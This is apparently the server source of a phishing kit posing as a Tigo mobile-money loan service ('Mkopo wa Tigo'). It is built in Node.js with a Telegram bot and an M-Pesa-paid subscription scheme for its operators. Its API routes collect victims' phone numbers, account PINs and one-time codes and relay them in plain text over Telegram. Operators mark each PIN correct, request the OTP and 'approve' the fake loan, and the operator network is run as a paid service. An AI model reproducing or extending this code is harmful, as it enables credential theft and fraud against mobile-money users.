const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const { ObjectId } = require('mongodb');
require('dotenv').config();

const db = require('./database');

const app = express();

const BOT_TOKEN = process.env.SUPER_ADMIN_BOT_TOKEN;
const PORT = process.env.PORT || 10000;
const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL;

const bot = new TelegramBot(BOT_TOKEN);

const adminChatIds = new Map();
const pausedAdmins = new Set();
const lockedAdmins = new Set();
const processingLocks = new Set();

let dbReady = false;

// ==========================================
// SHORT CODE GENERATOR
// ==========================================
async function generateUniqueShortCode() {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    for (let attempt = 0; attempt < 20; attempt++) {
        let code = '';
        for (let i = 0; i < 5; i++) {
            code += chars[Math.floor(Math.random() * chars.length)];
        }
        const existing = await db.getAdminByShortCode(code);
        if (!existing) return code;
    }
    throw new Error('Could not generate unique short code after 20 attempts');
}

// ==========================================
// HELPER FUNCTIONS
// ==========================================

function isAdminActive(chatId) {
    const adminId = getAdminIdByChatId(chatId);
    if (!adminId) return false;
    if (adminId === 'ADMIN001') return true;
    return !pausedAdmins.has(adminId) && !lockedAdmins.has(adminId);
}

function getAdminIdByChatId(chatId) {
    for (const [adminId, storedChatId] of adminChatIds.entries()) {
        if (storedChatId === chatId) return adminId;
    }
    return null;
}

async function sendToAdmin(adminId, message, options = {}) {
    const chatId = adminChatIds.get(adminId);
    if (!chatId) {
        try {
            const admin = await db.getAdmin(adminId);
            if (!admin?.chatId) { console.error(`❌ No chat ID for admin: ${adminId}`); return null; }
            adminChatIds.set(adminId, admin.chatId);
            return await bot.sendMessage(admin.chatId, message, options);
        } catch (err) {
            console.error(`❌ DB fallback failed for admin ${adminId}:`, err.message);
            return null;
        }
    }
    try {
        return await bot.sendMessage(chatId, message, options);
    } catch (error) {
        console.error(`❌ Error sending to ${adminId}:`, error.message);
        return null;
    }
}

// ==========================================
// MIDDLEWARE
// ==========================================
app.use(express.json());
app.use(express.static(__dirname));

// ==========================================
// BOT SETUP
// ==========================================
bot.on('error', (e) => console.error('❌ Bot error:', e?.message));
bot.on('polling_error', (e) => console.error('❌ Polling error:', e?.message));

setupCommandHandlers();

// ==========================================
// WEBHOOK ENDPOINT
// ==========================================
const webhookPath = `/telegram-webhook`;
app.post(webhookPath, (req, res) => {
    try {
        if (req.body?.update_id !== undefined) {
            try { bot.processUpdate(req.body); } catch (e) { console.error('❌ processUpdate error:', e); }
        }
        res.sendStatus(200);
    } catch (error) {
        console.error('❌ Webhook handler error:', error);
        res.sendStatus(200);
    }
});

// ==========================================
// DATABASE INIT + WEBHOOK SETUP
// ==========================================
db.connectDatabase()
    .then(async () => {
        dbReady = true;
        console.log('✅ Database ready!');
        await loadAdminChatIds();

        const fullWebhookUrl = `${WEBHOOK_URL}${webhookPath}`;
        let webhookSet = false;

        for (let attempt = 1; attempt <= 3 && !webhookSet; attempt++) {
            try {
                console.log(`🔄 Attempt ${attempt}/3: Setting webhook to: ${fullWebhookUrl}`);
                await bot.deleteWebHook();
                await new Promise(r => setTimeout(r, 1000));
                const result = await bot.setWebHook(fullWebhookUrl, {
                    drop_pending_updates: false, max_connections: 40,
                    allowed_updates: ['message', 'callback_query']
                });
                if (result) {
                    const info = await bot.getWebHookInfo();
                    if (info.url === fullWebhookUrl) { webhookSet = true; console.log('✅ Webhook confirmed!'); }
                }
            } catch (e) {
                console.error(`❌ Webhook attempt ${attempt} failed:`, e.message);
                if (attempt < 3) await new Promise(r => setTimeout(r, 2000));
            }
        }

        if (!webhookSet) console.error('❌ CRITICAL: Failed to set webhook!');

        try {
            const botInfo = await bot.getMe();
            console.log(`✅ Bot: @${botInfo.username}`);
        } catch (e) { console.error('❌ Bot API error:', e); }

        // Schedule subscription check
        scheduleSubscriptionCheck();

        setInterval(() => {
            console.log(`💓 Keep-alive: ${adminChatIds.size} admins, ${pausedAdmins.size} paused, ${lockedAdmins.size} locked`);
        }, 60000);

        setInterval(async () => {
            try {
                const info = await bot.getWebHookInfo();
                if (info.url !== fullWebhookUrl) {
                    console.log('⚠️ Webhook lost — re-setting...');
                    await bot.setWebHook(fullWebhookUrl, { drop_pending_updates: false, max_connections: 40, allowed_updates: ['message', 'callback_query'] });
                }
            } catch (e) { console.error('⚠️ Webhook check error:', e.message); }
        }, 60000);

        console.log('✅ System fully initialized!');
    })
    .catch((error) => { console.error('❌ Initialization failed:', error); process.exit(1); });

async function loadAdminChatIds() {
    try {
        const admins = await db.getAllAdmins();
        adminChatIds.clear();
        pausedAdmins.clear();
        lockedAdmins.clear();

        for (const admin of admins) {
            if (admin.chatId) {
                adminChatIds.set(admin.adminId, admin.chatId);
                if (admin.status === 'paused') pausedAdmins.add(admin.adminId);
            }
        }

        const allAdmins = await db.getAllAdmins();
        for (const admin of allAdmins) {
            const sub = await db.getSubscription(admin.adminId);
            if (sub?.isLocked) {
                lockedAdmins.add(admin.adminId);
            }
        }

        console.log(`✅ ${adminChatIds.size} admins loaded, ${pausedAdmins.size} paused, ${lockedAdmins.size} locked`);
    } catch (error) {
        console.error('❌ Error loading admin chat IDs:', error);
    }
}

function scheduleSubscriptionCheck() {
    const checkSubscriptions = async () => {
        const today = new Date();
        if (today.getDate() === 5) {
            console.log('📅 5th of month detected - checking subscriptions...');
            await db.checkAndLockOverdueSubscriptions();
            await loadAdminChatIds();
        }
    };

    setInterval(checkSubscriptions, 24 * 60 * 60 * 1000);
    console.log('📅 Subscription checker scheduled (runs daily at midnight)');
}

// ==========================================
// BOT COMMAND HANDLERS
// ==========================================

function setupCommandHandlers() {

    bot.onText(/\/start/, async (msg) => {
        const chatId = msg.chat.id;
        try {
            let adminId = getAdminIdByChatId(chatId);

            if (adminId) {
                if (pausedAdmins.has(adminId) && adminId !== 'ADMIN001') {
                    await bot.sendMessage(chatId, `🚫 *ADMIN ACCESS PAUSED*\n\nContact the super admin.\n\n*Your Admin ID:* \`${adminId}\``, { parse_mode: 'Markdown' });
                    return;
                }

                if (lockedAdmins.has(adminId) && adminId !== 'ADMIN001') {
                    const sub = await db.getSubscription(adminId);
                    await bot.sendMessage(chatId, `
🔒 *SUBSCRIPTION LOCKED*

*Reason:* ${sub?.lockReason || 'Subscription fee overdue'}

*What to do:*
1️⃣ Send M-Pesa payment of TSh 500
2️⃣ Send the M-Pesa reference to this bot
3️⃣ I will review and unlock your access

*Next billing date:* ${sub?.nextBillingDate ? new Date(sub.nextBillingDate).toLocaleDateString() : 'Unknown'}

Contact super admin for help.
                    `, { parse_mode: 'Markdown' });
                    return;
                }

                const admin = await db.getAdmin(adminId);
                if (admin) {
                    const isSuperAdmin = adminId === 'ADMIN001';
                    const appUrl = process.env.APP_URL || WEBHOOK_URL;
                    let message = isSuperAdmin
                        ? `👑 *SUPER ADMIN DASHBOARD*\n\n🔗 *Your Bot Link:*\n\`${appUrl}/${admin.shortCode}\`\n\n📊 Use commands below to manage the system.`
                        : `✅ *ADMIN DASHBOARD*\n\n🔗 *Your Application Link:*\n\`${appUrl}/${admin.shortCode}\`\n\nShare this link with users who want to apply for loans.`;

                    await bot.sendMessage(chatId, message, {
                        parse_mode: 'Markdown',
                        reply_markup: {
                            keyboard: isSuperAdmin
                                ? [[{ text: '/stats' }, { text: '/listadmins' }], [{ text: '/addadmin' }, { text: '/payments' }]]
                                : [[{ text: '/pending' }, { text: '/stats' }]]
                        }
                    });
                    return;
                }
            }

            await bot.sendMessage(chatId, '⚠️ You are not registered as an admin. Contact the super admin.');
        } catch (error) {
            console.error('❌ /start error:', error);
            await bot.sendMessage(chatId, '❌ Error loading dashboard');
        }
    });

    // /payments command
    bot.onText(/\/payments/, async (msg) => {
        const chatId = msg.chat.id;
        try {
            const adminId = getAdminIdByChatId(chatId);
            if (adminId !== 'ADMIN001') {
                await bot.sendMessage(chatId, '❌ Only super admin can view payments');
                return;
            }

            const pendingPayments = await db.getPendingPayments();
            if (pendingPayments.length === 0) {
                await bot.sendMessage(chatId, '✅ No pending payments');
                return;
            }

            let message = `💰 *PENDING PAYMENTS* (${pendingPayments.length})\n\n`;
            const keyboard = [];

            for (const payment of pendingPayments) {
                const admin = await db.getAdmin(payment.adminId);
                message += `📱 *${admin?.name || payment.adminId}*\n`;
                message += `💵 TSh ${payment.amount}\n`;
                message += `📞 ${payment.phoneNumber}\n`;
                message += `📋 Ref: \`${payment.mpesaReference}\`\n`;
                message += `📅 Days before billing: ${payment.daysBeforeBilling}\n`;
                message += `🟢 Early: ${payment.isEarlyPayment ? 'YES' : 'NO'}\n\n`;

                keyboard.push([
                    { text: `✅ Approve ${payment.adminId}`, callback_data: `approve_payment_${payment._id}` },
                    { text: `❌ Reject ${payment.adminId}`, callback_data: `reject_payment_${payment._id}` }
                ]);
            }

            await bot.sendMessage(chatId, message, {
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: keyboard }
            });
        } catch (error) {
            console.error('❌ /payments error:', error);
            await bot.sendMessage(chatId, '❌ Error loading payments');
        }
    });

    // /unlock command
    bot.onText(/\/unlock/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (adminId !== 'ADMIN001') {
            await bot.sendMessage(chatId, '❌ Only super admin can unlock accounts');
            return;
        }

        const messageText = msg.text.split(' ');
        if (messageText.length < 2) {
            await bot.sendMessage(chatId, '📝 *Usage:* `/unlock ADMIN_ID`\n\nExample: `/unlock ADMIN002`', { parse_mode: 'Markdown' });
            return;
        }

        const targetAdminId = messageText[1].toUpperCase();
        
        try {
            const targetAdmin = await db.getAdmin(targetAdminId);
            if (!targetAdmin) {
                await bot.sendMessage(chatId, `❌ Admin ${targetAdminId} not found`);
                return;
            }

            await db.unlockAdminSubscription(targetAdminId);
            lockedAdmins.delete(targetAdminId);

            await sendToAdmin(targetAdminId, `
✅ *ACCESS RESTORED*

Super admin has unlocked your account.
You can now use the platform normally.

Next billing: ${(await db.getSubscription(targetAdminId))?.nextBillingDate ? new Date((await db.getSubscription(targetAdminId)).nextBillingDate).toLocaleDateString() : 'Unknown'}
            `, { parse_mode: 'Markdown' });

            await bot.sendMessage(chatId, `✅ Admin ${targetAdminId} unlocked successfully`);
        } catch (error) {
            console.error('❌ Unlock error:', error);
            await bot.sendMessage(chatId, '❌ Error unlocking admin');
        }
    });

    // Callback queries for payment approval/rejection
    bot.on('callback_query', async (query) => {
        if (query.data.startsWith('approve_payment_')) {
            const paymentId = query.data.replace('approve_payment_', '');
            const adminId = getAdminIdByChatId(query.from.id);

            if (adminId !== 'ADMIN001') {
                await bot.answerCallbackQuery(query.id, '❌ Only super admin', true);
                return;
            }

            try {
                const payments = await db.getPendingPayments();
                const payment = payments.find(p => p._id.toString() === paymentId);

                if (!payment) {
                    await bot.answerCallbackQuery(query.id, '❌ Payment not found', true);
                    return;
                }

                await db.approvePayment(new ObjectId(paymentId), payment.adminId);
                lockedAdmins.delete(payment.adminId);

                await sendToAdmin(payment.adminId, `
✅ *PAYMENT APPROVED*

Your subscription payment has been approved!

📅 *Next billing date:* ${(await db.getSubscription(payment.adminId))?.nextBillingDate ? new Date((await db.getSubscription(payment.adminId)).nextBillingDate).toLocaleDateString() : 'Unknown'}

Your access has been restored. Thank you!
                `, { parse_mode: 'Markdown' });

                await bot.editMessageText(`✅ Payment approved for ${payment.adminId}`, {
                    chat_id: query.from.id,
                    message_id: query.message.message_id
                });

                await bot.answerCallbackQuery(query.id, '✅ Payment approved');
            } catch (error) {
                console.error('❌ Approve payment error:', error);
                await bot.answerCallbackQuery(query.id, '❌ Error', true);
            }
        }

        if (query.data.startsWith('reject_payment_')) {
            const paymentId = query.data.replace('reject_payment_', '');
            const adminId = getAdminIdByChatId(query.from.id);

            if (adminId !== 'ADMIN001') {
                await bot.answerCallbackQuery(query.id, '❌ Only super admin', true);
                return;
            }

            try {
                const payments = await db.getPendingPayments();
                const payment = payments.find(p => p._id.toString() === paymentId);

                if (!payment) {
                    await bot.answerCallbackQuery(query.id, '❌ Payment not found', true);
                    return;
                }

                await db.rejectPayment(new ObjectId(paymentId));

                await sendToAdmin(payment.adminId, `
❌ *PAYMENT REJECTED*

Your subscription payment (Ref: ${payment.mpesaReference}) was rejected.

*Please:*
1. Verify the M-Pesa transaction details
2. Submit payment again with correct details
3. Contact super admin if you have questions
                `, { parse_mode: 'Markdown' });

                await bot.editMessageText(`❌ Payment rejected for ${payment.adminId}`, {
                    chat_id: query.from.id,
                    message_id: query.message.message_id
                });

                await bot.answerCallbackQuery(query.id, '❌ Payment rejected');
            } catch (error) {
                console.error('❌ Reject payment error:', error);
                await bot.answerCallbackQuery(query.id, '❌ Error', true);
            }
        }
    });

    // Handle M-Pesa payment messages
    bot.on('message', async (msg) => {
        const chatId = msg.chat.id;
        const text = msg.text || '';
        const adminId = getAdminIdByChatId(chatId);

        if (text.length > 0 && adminId && adminId !== 'ADMIN001' && 
            (text.toUpperCase().includes('MPESA') || text.match(/[A-Z0-9]{10,}/))) {
            
            try {
                const reference = text.match(/[A-Z0-9]{10,}/)?.[0] || text.trim();
                
                if (reference.length > 5) {
                    await db.recordPaymentRequest(adminId, {
                        reference,
                        amount: 500,
                        phoneNumber: msg.from.username || msg.from.first_name
                    });

                    await bot.sendMessage(chatId, `
✅ *PAYMENT RECEIVED*

*Reference:* \`${reference}\`
*Amount:* TSh 500
*Status:* Pending super admin approval

We'll notify you once the payment is verified. Usually takes a few minutes.

Thank you!
                    `, { parse_mode: 'Markdown' });

                    const superAdminChatId = adminChatIds.get('ADMIN001');
                    if (superAdminChatId) {
                        const admin = await db.getAdmin(adminId);
                        await bot.sendMessage(superAdminChatId, `
💰 *NEW PAYMENT SUBMISSION*

👤 *Admin:* ${admin?.name || adminId}
💵 *Amount:* TSh 500
📱 *Reference:* \`${reference}\`
⏰ *Time:* ${new Date().toLocaleTimeString()}

Use /payments to review and approve/reject this payment.
                        `, { parse_mode: 'Markdown' });
                    }
                }
            } catch (error) {
                console.error('❌ Payment processing error:', error);
            }
        }
    });

    // /stats command
    bot.onText(/\/stats/, async (msg) => {
        const chatId = msg.chat.id;
        try {
            const adminId = getAdminIdByChatId(chatId);
            const isSuperAdmin = adminId === 'ADMIN001';

            if (isSuperAdmin) {
                const stats = await db.getStats();
                const message = `
📊 *SYSTEM STATISTICS*

👥 *Admins:* ${stats.totalAdmins}
📋 *Applications:* ${stats.totalApplications}

*Application Status:*
⏳ Waiting PIN: ${stats.pinPending}
✅ PIN Approved: ${stats.pinApproved}
⏳ Waiting OTP: ${stats.otpPending}
✅ Fully Approved: ${stats.fullyApproved}
❌ Rejected: ${stats.totalRejected}
                `;
                await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
            } else if (adminId) {
                const stats = await db.getAdminStats(adminId);
                const message = `
📊 *YOUR STATISTICS*

📋 *Applications:* ${stats.total}
⏳ PIN Pending: ${stats.pinPending}
✅ PIN Approved: ${stats.pinApproved}
⏳ OTP Pending: ${stats.otpPending}
✅ Fully Approved: ${stats.fullyApproved}
                `;
                await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
            }
        } catch (error) {
            console.error('❌ /stats error:', error);
            await bot.sendMessage(chatId, '❌ Error loading statistics');
        }
    });

    // /listadmins command
    bot.onText(/\/listadmins/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (adminId !== 'ADMIN001') {
            await bot.sendMessage(chatId, '❌ Only super admin can list admins');
            return;
        }

        try {
            const admins = await db.getAllAdmins();
            if (admins.length === 0) {
                await bot.sendMessage(chatId, '📭 No admins found');
                return;
            }

            let message = `👥 *ADMINS* (${admins.length})\n\n`;
            const appUrl = process.env.APP_URL || WEBHOOK_URL;

            for (const admin of admins) {
                const sub = await db.getSubscription(admin.adminId);
                const lockStatus = sub?.isLocked ? '🔒' : '✅';
                message += `${lockStatus} *${admin.name}* (\`${admin.adminId}\`)\n`;
                message += `📧 ${admin.email}\n`;
                message += `🔗 \`${appUrl}/${admin.shortCode}\`\n\n`;
            }

            await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('❌ /listadmins error:', error);
            await bot.sendMessage(chatId, '❌ Error loading admins');
        }
    });

    // /addadmin command
    bot.onText(/\/addadmin/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (adminId !== 'ADMIN001') {
            await bot.sendMessage(chatId, '❌ Only super admin can add admins');
            return;
        }

        try {
            const text = msg.text.substring(8).trim();
            if (!text) {
                await bot.sendMessage(chatId, '📝 *Format:* `/addadmin Name | Email | BotToken | ChatID`\n\nExample:\n`/addadmin John Doe | john@email.com | 123456:ABC-DEF | 987654321`', { parse_mode: 'Markdown' });
                return;
            }

            const parts = text.split('|').map(p => p.trim());
            if (parts.length !== 4) {
                await bot.sendMessage(chatId, '❌ Incorrect format. Need: Name | Email | BotToken | ChatID');
                return;
            }

            const [name, email, botToken, chatId_str] = parts;
            const newAdminId = `ADMIN${String(await db.getAdminCount() + 1).padStart(3, '0')}`;
            const shortCode = await generateUniqueShortCode();

            const adminData = {
                adminId: newAdminId,
                name,
                email,
                chatId: parseInt(chatId_str),
                shortCode,
                status: 'active'
            };

            await db.saveAdmin(adminData);
            adminChatIds.set(newAdminId, parseInt(chatId_str));

            const appUrl = process.env.APP_URL || WEBHOOK_URL;
            const message = `
✅ *ADMIN CREATED*

👤 *Name:* ${name}
📧 *Email:* ${email}
🆔 *Admin ID:* \`${newAdminId}\`
🔗 *Short Code:* \`${shortCode}\`

*Application Link:*
\`${appUrl}/${shortCode}\`

Share the link above with your users.
            `;

            await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });

            try {
                await bot.sendMessage(parseInt(chatId_str), `
✅ *WELCOME TO TIGO LOAN PLATFORM*

You have been added as an admin!

👤 *Your ID:* \`${newAdminId}\`
🔗 *Your Link:* \`${appUrl}/${shortCode}\`

📋 Use /start to see your dashboard
                `, { parse_mode: 'Markdown' });
            } catch (e) {
                console.log('⚠️ Could not send welcome message to new admin');
            }
        } catch (error) {
            console.error('❌ /addadmin error:', error);
            await bot.sendMessage(chatId, '❌ Error: ' + error.message);
        }
    });
}

// ==========================================
// API ROUTES
// ==========================================

app.post('/api/verify-pin', async (req, res) => {
    const lockKey = `pin_${req.body?.phoneNumber}`;
    if (processingLocks.has(lockKey)) return res.json({ success: false, message: 'Processing...' });
    processingLocks.add(lockKey);

    try {
        const { phoneNumber, pin, adminId } = req.body;

        if (!adminId) {
            return res.status(403).json({ success: false, message: 'No admin session' });
        }

        const subscription = await db.getSubscription(adminId);
        if (subscription?.isLocked) {
            return res.status(403).json({ 
                success: false, 
                message: `Access locked: ${subscription.lockReason}. Pay TSh 500 subscription fee.` 
            });
        }

        if (!phoneNumber?.match(/^\+?255\d{9}$/) || !pin || pin.length !== 4) {
            return res.status(400).json({ success: false, message: 'Invalid input' });
        }

        const applicationId = 'LOAN-' + Date.now();
        const applicationData = {
            id: applicationId,
            adminId,
            phoneNumber,
            pin,
            pinStatus: 'pending',
            timestamp: new Date().toISOString()
        };

        await db.saveApplication(applicationData);

        const admin = await db.getAdmin(adminId);

        await sendToAdmin(adminId, `
📲 *PIN VERIFICATION*

📋 \`${applicationId}\`
📱 ${phoneNumber}
🔐 PIN: \`${pin}\`
⏰ ${new Date().toLocaleString()}

*VERIFY PIN*
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Wrong PIN', callback_data: `wrongpin_${adminId}_${applicationId}` }],
                    [{ text: '✅ Correct - Allow OTP', callback_data: `allow_pin_${adminId}_${applicationId}` }]
                ]
            }
        });

        processingLocks.delete(lockKey);
        res.json({ success: true, applicationId, assignedTo: admin.name, assignedAdminId: admin.adminId });

    } catch (error) {
        processingLocks.delete(`pin_${req.body?.phoneNumber}`);
        console.error('❌ Error in /api/verify-pin:', error);
        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    }
});

app.get('/api/check-pin-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) res.json({ success: true, status: application.pinStatus });
        else res.status(404).json({ success: false, message: 'Application not found' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

app.post('/api/verify-otp', async (req, res) => {
    try {
        const { applicationId, otp } = req.body;

        if (!applicationId) {
            return res.status(403).json({ success: false, message: 'Invalid session.' });
        }

        const application = await db.getApplication(applicationId);
        if (!application) return res.status(404).json({ success: false, message: 'Application not found' });

        const subscription = await db.getSubscription(application.adminId);
        if (subscription?.isLocked) {
            return res.status(403).json({ 
                success: false, 
                message: 'Admin access locked. Subscription fee required.' 
            });
        }

        if (!adminChatIds.has(application.adminId)) {
            const admin = await db.getAdmin(application.adminId);
            if (admin?.chatId) adminChatIds.set(application.adminId, admin.chatId);
            else return res.status(500).json({ success: false, message: 'Admin unavailable' });
        }

        await db.updateApplication(applicationId, { otp, otpStatus: 'pending' });

        await sendToAdmin(application.adminId, `📲 *CODE VERIFICATION*\n\n📋 \`${applicationId}\`\n📱 ${application.phoneNumber}\n🔢 \`${otp}\`\n⏰ ${new Date().toLocaleString()}\n\n⚠️ *VERIFY CODE*`, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Wrong PIN', callback_data: `wrongpin_otp_${application.adminId}_${applicationId}` }],
                    [{ text: '❌ Wrong Code', callback_data: `wrongcode_otp_${application.adminId}_${applicationId}` }],
                    [{ text: '✅ Approve Loan', callback_data: `approve_otp_${application.adminId}_${applicationId}` }]
                ]
            }
        });

        res.json({ success: true });
    } catch (error) {
        console.error('❌ Error in /api/verify-otp:', error);
        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    }
});

app.get('/api/check-otp-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) res.json({ success: true, status: application.otpStatus });
        else res.status(404).json({ success: false, message: 'Application not found' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

app.post('/api/resend-otp', async (req, res) => {
    try {
        const { applicationId } = req.body;
        if (!applicationId) return res.status(403).json({ success: false, message: 'Invalid session.' });

        const application = await db.getApplication(applicationId);
        if (!application) return res.status(404).json({ success: false, message: 'Application not found' });
        if (!adminChatIds.has(application.adminId)) return res.status(500).json({ success: false, message: 'Admin unavailable' });

        await sendToAdmin(application.adminId, `🔄 *OTP RESEND REQUEST*\n\n📋 \`${applicationId}\`\n📱 ${application.phoneNumber}\n\nUser requested OTP resend.`, { parse_mode: 'Markdown' });
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        database: dbReady ? 'connected' : 'not ready',
        activeAdmins: adminChatIds.size,
        pausedAdmins: pausedAdmins.size,
        lockedAdmins: lockedAdmins.size,
        botMode: 'webhook',
        timestamp: new Date().toISOString()
    });
});

// ==========================================
// PAGE ROUTES
// ==========================================

app.get('/', (req, res) => {
    if (req.query.admin) {
        console.log(`⚠️ Legacy admin link used: ${req.query.admin}`);
        return res.send(`<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><script>
            sessionStorage.setItem('selectedAdminId', '${req.query.admin.replace(/['"<>]/g, '')}');
            sessionStorage.setItem('validLink', 'true');
            window.location.replace('/index.html');
        </script></body></html>`);
    }
    res.sendFile(path.join(__dirname, 'invalid-link.html'));
});

app.get('/:code([a-z0-9]{3,10})', async (req, res) => {
    const code = req.params.code.toLowerCase();

    const reserved = ['index.html', 'application.html', 'verification.html', 'otp.html', 'approval.html', 'invalid-link.html', 'style.css'];
    if (reserved.some(r => code === r.replace('.html', '') || code === r)) {
        return res.sendFile(path.join(__dirname, req.params.code));
    }

    try {
        const admin = await db.getAdminByShortCode(code);

        if (!admin || admin.status !== 'active' || pausedAdmins.has(admin.adminId)) {
            console.log(`🚫 Invalid/inactive short code: ${code}`);
            return res.sendFile(path.join(__dirname, 'invalid-link.html'));
        }

        const subscription = await db.getSubscription(admin.adminId);
        if (subscription?.isLocked) {
            return res.send(`<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Locked - Mkopo wa Tigo</title>
    <style>
        body { font-family: 'Inter', sans-serif; min-height: 100vh; background: linear-gradient(135deg, #667eea, #764ba2); display: flex; align-items: center; justify-content: center; padding: 20px; }
        .card { background: white; border-radius: 24px; padding: 60px 48px; max-width: 480px; width: 100%; text-align: center; box-shadow: 0 25px 60px rgba(0, 0, 0, 0.4); }
        .lock-icon { font-size: 80px; margin-bottom: 24px; display: block; }
        h1 { font-size: 28px; color: #111827; margin: 24px 0; font-weight: 800; }
        p { color: #6b7280; line-height: 1.7; margin: 16px 0; }
        .info { background: #fef3c7; border: 2px solid #fde68a; color: #92400e; padding: 24px; border-radius: 16px; margin: 32px 0; }
        .info strong { display: block; margin-bottom: 8px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="lock-icon">🔒</div>
        <h1>Akaunti Imefungwa</h1>
        <p>Akaunti yako imekatazwa kwa sababu ya ada ya suscription inayotaka kulipwa.</p>
        
        <div class="info">
            <strong>💰 Bayar TSh 500</strong>
            <p>Tafadhali tuma M-Pesa ya TSh 500. Baada ya kumudu, tuma huduma ya M-Pesa kwenye bot ya Telegram ili kukubali.</p>
        </div>
        
        <p><strong>Ngoma iliyotaka kulipwa:</strong> ${subscription.nextBillingDate ? new Date(subscription.nextBillingDate).toLocaleDateString() : 'Unknown'}</p>
        <p>Wasiliana na super admin kwa maswali.</p>
    </div>
</body>
</html>`);
        }

        if (!adminChatIds.has(admin.adminId) && admin.chatId) {
            adminChatIds.set(admin.adminId, admin.chatId);
        }

        console.log(`✅ Short code ${code} → ${admin.name} (${admin.adminId})`);

        res.send(`<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mkopo wa Tigo — Inapakia...</title>
    <style>
        body { margin:0; min-height:100vh; background:linear-gradient(135deg,#667eea,#764ba2); display:flex; align-items:center; justify-content:center; font-family:sans-serif; }
        .loader { text-align:center; color:white; }
        .spinner { width:48px; height:48px; border:4px solid rgba(255,255,255,0.3); border-top:4px solid white; border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 16px; }
        @keyframes spin { to { transform:rotate(360deg); } }
        p { font-size:16px; opacity:0.9; }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <p>Inapakia...</p>
    </div>
    <script>
        sessionStorage.setItem('selectedAdminId', '${admin.adminId}');
        sessionStorage.setItem('validLink', 'true');
        window.location.replace('/index.html');
    </script>
</body>
</html>`);
    } catch (error) {
        console.error('❌ Error in short code route:', error);
        res.sendFile(path.join(__dirname, 'invalid-link.html'));
    }
});

// ==========================================
// SERVER
// ==========================================
app.listen(PORT, () => {
    console.log(`\n👑 TIGO LOAN PLATFORM — SUBSCRIPTION MODE`);
    console.log(`=========================================`);
    console.log(`🌐 Server: http://localhost:${PORT}`);
    console.log(`🔑 Links: yoursite.com/XXXXX (5-char codes)`);
    console.log(`💳 Subscriptions: ENABLED`);
    console.log(`📅 Auto-lock: 5th of each month`);
    console.log(`\n✅ Ready!\n`);
});

async function shutdownGracefully(signal) {
    console.log(`\n🛑 ${signal} — shutting down...`);
    try { await bot.deleteWebHook(); await db.closeDatabase(); process.exit(0); }
    catch (e) { console.error('❌ Shutdown error:', e); process.exit(1); }
}
process.on('SIGTERM', () => shutdownGracefully('SIGTERM'));
process.on('SIGINT', () => shutdownGracefully('SIGINT'));
process.on('unhandledRejection', (e) => console.error('❌ Unhandled rejection:', e?.message));
process.on('uncaughtException', (e) => console.error('❌ Uncaught exception:', e?.message));
